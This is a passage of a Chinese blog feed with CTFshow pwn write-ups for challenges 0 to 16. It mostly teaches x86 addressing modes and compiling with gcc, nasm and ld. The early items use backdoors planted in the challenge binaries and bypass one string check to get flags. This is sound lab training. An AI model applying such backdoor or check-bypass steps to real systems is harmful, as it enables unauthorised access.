{
    "version": "https://jsonfeed.org/version/1",
    "title": "Blog • All posts by \"ctfshow\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow/",
            "url": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow/",
            "title": "CTFshow(Test_your_nc部分,0~4)",
            "date_published": "2023-09-15T03:01:15.000Z",
            "content_html": "<h1 id=\"pwn0\"><a class=\"anchor\" href=\"#pwn0\">#</a> pwn0</h1>\n<h2 id=\"题目\"><a class=\"anchor\" href=\"#题目\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWt1sS.png\" alt=\"\" /></p>\n<p>利用 ssh 连接，不知道为什么之前连接是失败的<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWffpV.png\" alt=\"\" /></p>\n<p>然后输入密码会加载一大堆东西</p>\n<p>而且密码不在当前目录下需要到根目录查看</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWfLfx.png\" alt=\"\" /></p>\n<h1 id=\"pwn1\"><a class=\"anchor\" href=\"#pwn1\">#</a> pwn1</h1>\n<h2 id=\"题目-2\"><a class=\"anchor\" href=\"#题目-2\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWhgDe.md.png\" alt=\"\" /></p>\n<p>题目里已经说明有后门了，下载附件利用 ida 打开</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWhqbQ.png\" alt=\"\" /></p>\n<p>发现输出完句子之后会直接执行 cat flag，那么直接 nc 连接即可<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWhXUs.md.png\" alt=\"\" /></p>\n<h1 id=\"pwn2\"><a class=\"anchor\" href=\"#pwn2\">#</a> pwn2</h1>\n<h2 id=\"题目-3\"><a class=\"anchor\" href=\"#题目-3\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPW4pvT.png\" alt=\"\" /></p>\n<p>下载附件查看程序信息，发现是 64 位程序<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPW4WsU.md.png\" alt=\"\" /></p>\n<p>ida 打开<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWL4e0.png\" alt=\"\" /><br />\n发现有个 system (/bin/sh), 直接 给权限了，那么就直接可以获取 flag</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWL7YF.png\" alt=\"\" /></p>\n<h1 id=\"pwn3\"><a class=\"anchor\" href=\"#pwn3\">#</a> pwn3</h1>\n<h2 id=\"题目-4\"><a class=\"anchor\" href=\"#题目-4\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWLLl9.png\" alt=\"\" /></p>\n<p>查看保护是 64 位程序，ida 打开<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWLzTK.png\" alt=\"\" /></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWOCfe.png\" alt=\"\" /></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWOFld.png\" alt=\"\" /></p>\n<p>这里考察我们对函数的理解</p>\n<ul>\n<li>put 函数输出的是字符串</li>\n<li>echo 主要用于打印简单的字符串和变量值</li>\n<li>cat 用来查看文件内容，更侧重于处理文件，实现文件内容的读取和拼接等操作</li>\n</ul>\n<p>(只有 system (cat /flag) 输出了 flag，选择 4 只会输出字符串”/ctfshow_flag“)<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWOllj.png\" alt=\"\" /></p>\n<h1 id=\"pwn4\"><a class=\"anchor\" href=\"#pwn4\">#</a> pwn4</h1>\n<h2 id=\"题目-5\"><a class=\"anchor\" href=\"#题目-5\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWOonI.png\" alt=\"\" /></p>\n<p>查看程序是 64 位，用 ida 打开<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfDMex.png\" alt=\"\" /></p>\n<p><code>execve_func()</code>  里有后门<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfDlTK.md.png\" alt=\"\" /></p>\n<p><code>strcmp(str1,str2)</code>  该函数会进行比较，str1=str2 时会返回 0，所以输入 <code>CTFshowPWN</code>  以此绕过判断<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfDPe0.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn",
                "nc"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow5-34/",
            "url": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow5-34/",
            "title": "CTFshow(前置基础部分-汇编,5~34)",
            "date_published": "2023-09-15T03:01:15.000Z",
            "content_html": "<h1 id=\"官方wp\"><a class=\"anchor\" href=\"#官方wp\">#</a> 官方 wp：</h1>\n<p><code>0-36：</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly95c3lucmg3N3JqLmZlaXNodS5jbi9kb2N4L0h3MW1kMGFaU291Y0ZpeEVmNkFjMm90UW53aA==\">https://ysynrh77rj.feishu.cn/docx/Hw1md0aZSoucFixEf6Ac2otQnwh</span></p>\n<p><code>37-72：</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly95c3lucmg3N3JqLmZlaXNodS5jbi9kb2N4L0MxTHZkc1NuWW9OSWVneFZOREVjbHo4M25sZQ==\">https://ysynrh77rj.feishu.cn/docx/C1LvdsSnYoNIegxVNDEclz83nle</span></p>\n<h1 id=\"前置知识\"><a class=\"anchor\" href=\"#前置知识\">#</a> 前置知识：</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzU2Njk2Mzc4L2FydGljbGUvZGV0YWlscy8xMjgwNjc0Mzg=\">https://blog.csdn.net/m0_56696378/article/details/128067438</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQUYlODQlRTUlQUQlOTglRTUlOTklQTglRTUlQUYlQkIlRTUlOUQlODAlRTYlOTYlQjklRTUlQkMlOEYvNjY4NjQwOA==\">https://baike.baidu.com/item/%E5%AF%84%E5%AD%98%E5%99%A8%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F/6686408</span></p>\n<h1 id=\"pwn5\"><a class=\"anchor\" href=\"#pwn5\">#</a> pwn5</h1>\n<h2 id=\"题目\"><a class=\"anchor\" href=\"#题目\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfMr7t.png\" alt=\"\" /><br />\n查看查询信息（另一个 asm 文件是用于在 C<ins> 源码中内嵌汇编语言。ASM 能写在任何 C</ins> 合法语句中，asm 还不是 C 的标准关键字）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQC4K.png\" alt=\"\" /></p>\n<p>32 位程序，利用 ida 打开</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQl8S.png\" alt=\"\" /></p>\n<p>发现是 int 0x80，为系统调用，通过系统调用 write 函数来输出，输出结果即为 flag<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQYbn.png\" alt=\"\" /></p>\n<p>【关于 asm，给我们解释了汇编代码的含义】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQB2F.png\" alt=\"\" /><br />\n系统调用（int 0x80）在后面执行，系统调用号在前面</p>\n<h1 id=\"pwn6立即寻址方式\"><a class=\"anchor\" href=\"#pwn6立即寻址方式\">#</a> pwn6（立即寻址方式）</h1>\n<h2 id=\"题目-2\"><a class=\"anchor\" href=\"#题目-2\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf1WcD.png\" alt=\"\" /><br />\n32 位程序，让我们计算立即寻址方式后的 eax 的值</p>\n<p>【立即寻址方式是一种操作数寻址方式。在立即寻址方式下，指令的地址字段指出的是操作数本身，而不是操作数的地址。立即寻址方式的特点是指令执行时间很短，因为它不需要访问内存取数，从而节省了访问内存的时间。立即寻址方式常用于指令的源操作数，不能用作目的操作数。例如，MOV AX,5678H 指令中的 5678H 就是一个立即数，作为源操作数直接参与指令的运算。】这意味着，将寄存器不会去将该值当作地址，直接看作一个数值<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf1zHs.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov eax, 0Bh        #eax=0xBh\nadd  eax, 1BF48h #eax=eax+0x1BF48h\nsub   eax, 1             #eax=eax-1\n</code></pre>\n<p>得到 eax=0x1BF52h  (114514)</p>\n<p>所以答案 ctfshow (114514)</p>\n<p>此题 asm<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf39Nq.png\" alt=\"\" /></p>\n<h1 id=\"pwn7寄存器寻址方式\"><a class=\"anchor\" href=\"#pwn7寄存器寻址方式\">#</a> pwn7（寄存器寻址方式）</h1>\n<h2 id=\"题目-3\"><a class=\"anchor\" href=\"#题目-3\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3JDH.png\" alt=\"\" /></p>\n<p>【寄存器寻址方式：操作数在 CPU 内部的寄存器中，指令指定寄存器号。，意味着直接取指定寄存器当中的值即可】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3a5t.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov ebx, 36Dh  #ebx=0x36Dh\nmov edx, ebx     #edx=ebx \n</code></pre>\n<p 0x36D=\"\">edx=0x36Dh  (877），<br />\nctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3R5q.png\" alt=\"\" /></p>\n<h1 id=\"pwn8直接寻址方式\"><a class=\"anchor\" href=\"#pwn8直接寻址方式\">#</a> pwn8（直接寻址方式）</h1>\n<h2 id=\"题目-4\"><a class=\"anchor\" href=\"#题目-4\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3qaR.png\" alt=\"\" /></p>\n<p>【直接寻址方式：在指令中直接给出参与运算的操作数及运算结果所存放的主存地址，即在指令中直接给出有效地址。意味着直接将地址赋值给对应寄存器】</p>\n<p>32 位程序，查看汇编<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf3XPx.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov ecx, dword_80490E8  #ecx=dword_80490E8 (地址就是0x80490E8)\n</code></pre>\n<p 0x80490E8=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfrBuR.png\" alt=\"\" /></p>\n<h1 id=\"pwn9-间接寻址方式\"><a class=\"anchor\" href=\"#pwn9-间接寻址方式\">#</a> pwn9 （间接寻址方式）</h1>\n<h2 id=\"题目-5\"><a class=\"anchor\" href=\"#题目-5\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfrDD1.png\" alt=\"\" /></p>\n<p>【间接寻址方式：间接寻址是在直接寻址的基础上面建立起来的，也就是直接寻址得到的数据是一个地址，通过这个地址找到最终的数据，也就是两次寻址，第一次得到的是地址，第二次才是目标数据】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfsnVx.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov esi,  offset dword_80490E8  #esi=offset dword_80490E8\nmov eax, [esi]  #eax=*esi (取地址内的值，方括号意味着取该地址的值)\n</code></pre>\n<p>利用 ida 查看其中的值</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfsBRg.png\" alt=\"\" /></p>\n<p 0x636C6557=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfs3xH.png\" alt=\"\" /></p>\n<h1 id=\"pwn10寄存器相对寻址方式\"><a class=\"anchor\" href=\"#pwn10寄存器相对寻址方式\">#</a> pwn10（寄存器相对寻址方式）</h1>\n<h2 id=\"题目-6\"><a class=\"anchor\" href=\"#题目-6\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf27an.md.png\" alt=\"\" /></p>\n<p>【寄存器相对寻址方式：操作数的有效地址是一个寄存器和位移量之和。地址是寄存器 + 一个偏移值，具体值在该地址里】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfWmlT.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov ecx, offset dword_80490E8   #ecx=dword_80490E8\nadd  ecx, 4   #ecx=ecx+4\nmov eax, [ecx]  #eax=*ecx (取该地址的值)\n</code></pre>\n<p>eax=*(0x80490E8+4)=&quot;ome_to_CTFshow_PWN&quot;</p>\n<p ome_to_CTFshow_PWN=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPff3Dg.png\" alt=\"\" /></p>\n<h1 id=\"pwn11基址变址寻址方式\"><a class=\"anchor\" href=\"#pwn11基址变址寻址方式\">#</a> pwn11（基址变址寻址方式）</h1>\n<h2 id=\"题目-7\"><a class=\"anchor\" href=\"#题目-7\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPffd2V.png\" alt=\"\" /></p>\n<p>【基址变址寻址方式：操作数的有效地址是一个基址寄存器和一个变址寄存器的内容之和。一般为寄存器直接的运算在赋值】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPffHIA.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov ecx, offset dword_80490E8  #exc=0x80490E8\nmov edx, 2   #edx=2\nmov dax,[exc+edx*2]  #ecx=*(0x80490E8+2*2)\n</code></pre>\n<p>ecx=&quot;ome_to_CTFshow_PWN&quot;</p>\n<p ome_to_CTFshow_PWN=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPf5TZF.png\" alt=\"\" /></p>\n<h1 id=\"pwn12相对基址变址寻址方式\"><a class=\"anchor\" href=\"#pwn12相对基址变址寻址方式\">#</a> pwn12（相对基址变址寻址方式）</h1>\n<h2 id=\"题目-8\"><a class=\"anchor\" href=\"#题目-8\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh3Tne.png\" alt=\"\" /></p>\n<p>【相对基址变址寻址方式：操作数的有效地址是一个基址寄存器和一个变址寄存器以及一个位移量之和。一般为两个寄存器 + 一个值】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh3j9P.png\" alt=\"\" /></p>\n<pre><code class=\"language-asm\">mov  ecx, offset dword_80490E8  #ecx=80490E8\nmov  edx, 1   #edi=1\nadd   ecx,  8  #ecx=ecx+8\nmov  eax,  [ecx+edx*2-6]  #eax=*(ecx+edx*2-6)\n#eax=*(80490EC)='ome_to_CTFshow_PWN'\n</code></pre>\n<p ome_to_CTFshow_PWN=\"\">ctfshow</p>\n<p>【asm】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPh8uB4.png\" alt=\"\" /></p>\n<h1 id=\"pwn13gcc编译\"><a class=\"anchor\" href=\"#pwn13gcc编译\">#</a> pwn13（gcc 编译）</h1>\n<h2 id=\"题目-9\"><a class=\"anchor\" href=\"#题目-9\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh8KHJ.png\" alt=\"\" /></p>\n<p>进行 gcc 编译：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zODA5Mzc5NDY=\">https://zhuanlan.zhihu.com/p/380937946</span></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc test.c <span class=\"token parameter variable\">-o</span> <span class=\"token builtin class-name\">test</span> <span class=\"token comment\">#直接编译成可执行文件（-o 指定输出文件名称，默认 a.out）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>./test  <span class=\"token comment\">#运行程序</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh8rCt.png\" alt=\"\" /></p>\n<h1 id=\"pwn14\"><a class=\"anchor\" href=\"#pwn14\">#</a> pwn14</h1>\n<h2 id=\"题目-10\"><a class=\"anchor\" href=\"#题目-10\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPh86v8.md.png\" alt=\"\" /></p>\n<p>源码</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">BUFFER_SIZE</span> <span class=\"token expression\"><span class=\"token number\">1024</span></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    FILE <span class=\"token operator\">*</span>fp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span>BUFFER_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token class-name\">size_t</span> n<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    fp <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"key\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Nothing here!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">char</span> output<span class=\"token punctuation\">[</span>BUFFER_SIZE <span class=\"token operator\">*</span> <span class=\"token number\">9</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">int</span> offset <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ctfshow&#123;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>n <span class=\"token operator\">=</span> <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> BUFFER_SIZE<span class=\"token punctuation\">,</span> fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">!=</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">feof</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> output<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>此处有 <code>fopen(&quot;key&quot;,:&quot;rb&quot;)</code>  要打开文件 (rb 以读写方式打开一个二进制文件)，不能让其为空，手动创建一个 key 文件，题目说明 key 为 <code>CTFshow</code></p>\n<p>创建完成后用 gcc 编译，执行程序<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPhJc7Q.png\" alt=\"\" /></p>\n<h1 id=\"pwn15编译汇编代码形成可执行文件\"><a class=\"anchor\" href=\"#pwn15编译汇编代码形成可执行文件\">#</a> pwn15（编译汇编代码形成可执行文件）</h1>\n<p>## 题目<br />\n<img data-src=\"https://img1.imgtp.com/2023/09/19/14UYM6tT.png\" alt=\"\" /></p>\n<p><strong>【编译汇编代码】</strong></p>\n<p>[ams 基础，nasm 使用简介]：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYW5nd2VpMDUxMi9hcnRpY2xlL2RldGFpbHMvNTE2MzY2MDI=\">https://blog.csdn.net/jiangwei0512/article/details/51636602</span></p>\n<p>利用 <code>nasm</code>  命令，使用下面的命令将汇编代码编译成对象文件（会生成一个 pwn15.o 的对象文件）：</p>\n<pre><code>nasm -f elf pwn15.ams  # -f 是指定编译出来的 .o文件的格式\n</code></pre>\n<p>【Linux 命令 —ld 命令】：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNDE1MDA0\">https://cloud.tencent.com/developer/article/1415004</span></p>\n<pre><code>ld命令是二进制工具集GNU Binutils的一员，是GNU链接器，用于将目标文件与库链接为可执行程序或库文件。\n</code></pre>\n<p>利用 <code>ld</code>  命令将对象文件链接成可执行文件</p>\n<pre><code>ld -m elf_i386 -s-o pwn15 pwn.o #-m是模拟指定的链接器，-s忽略来自输出文件的所有符号信息，-o 指定生成文件名称\n</code></pre>\n<p>查看汇编：</p>\n<pre><code class=\"language-asm\">section .data\n    str1 db &quot;CTFshow&quot;,0\n    str2 db &quot;_3@sy&quot;,0\n    str3 db &quot;@ss3mb1y&quot;,0\n    str4 db &quot;_1s&quot;,0\n    str5 db &quot;ctfshow&#123;&quot;\n    str6 db &quot;&#125;&quot;\n\nsection .text\n    global _start\n\n_start:\n    mov eax, 4 \n    mov ebx, 1 \n    mov ecx, str5 \n    mov edx, 8\n    int 0x80 \n\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, str3\n    mov edx, 8\n    int 0x80\n\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, str4\n    mov edx, 3\n    int 0x80\n\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, str2\n    mov edx, 5\n    int 0x80\n\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, str6\n    mov edx, 1\n    int 0x80\n\n    mov eax, 1 \n    xor ebx, ebx \n    int 0x80 \n\n</code></pre>\n<p>执行 <code>nasm -f elf pwn15.ams</code>  命令和 <code>ld -m elf_i386 -s-o pwn15 pwn.o </code> ，<br />\n会产生可执行文件 pwn15，执行即可（原对象文件不消失）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5PX4J.png\" alt=\"\" /></p>\n<h1 id=\"pwn16-使用gcc编译可执行文件\"><a class=\"anchor\" href=\"#pwn16-使用gcc编译可执行文件\">#</a> pwn16 （使用 gcc 编译可执行文件）</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTg1MDY2\">https://cloud.tencent.com/developer/article/1585066</span></p>\n<p>文件扩展名为.s 的文件其实就是汇编代码文件，使用下面的命令将汇编代码转成对应的二进制形式的 cpu 指令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc <span class=\"token parameter variable\">-c</span> main.s</pre></td></tr></table></figure><p>链接链接的作用是把代码之间的引用关系关联起来，最终生成一个完整的程序：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc main.o libc.o  <span class=\"token comment\">#此题只需要一个目标文件，所以直接用 gcc main.o 即可</span></pre></td></tr></table></figure><h2 id=\"题目-11\"><a class=\"anchor\" href=\"#题目-11\">#</a> 题目</h2>\n<p><img 